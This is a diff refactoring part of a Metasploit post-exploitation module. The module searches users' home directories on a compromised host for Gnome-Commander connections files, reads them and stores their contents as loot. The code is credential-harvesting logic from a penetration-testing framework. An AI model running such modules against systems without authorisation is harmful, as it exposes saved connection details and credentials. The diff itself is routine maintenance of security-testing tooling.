@@ -34,20 +34,21 @@ class Metasploit3 < Msf::Post
     # Try to find connections file in users homes
     user_dirs.each do |dir|
       connections_file = "#{dir}/.gnome-commander/connections"
-      unless file?(connections_file)
-        # File not found
-        print_error("File not found : #{connections_file}")
-      else
+      if file?(connections_file)
         begin
+          str_file=read_file(connections_file)
           print_good("File found : #{connections_file}")
-          print_line(read_file(connections_file))
-          p = store_loot("connections", "text/plain", session, read_file(connections_file), connections_file, "Gnome-Commander connections")
+          vprint_line(str_file)
+          p = store_loot("connections", "text/plain", session, str_file, connections_file, "Gnome-Commander connections")
           print_good ("Connections file saved to #{p}")
           print_line()
         rescue EOFError
           # If there's nothing in the file, we hit EOFError
           print_error("Nothing read from file: #{connections_file}, file may be empty")
         end
+      else
+        # File not found
+        print_error("File not found : #{connections_file}")
       end
     end
   end
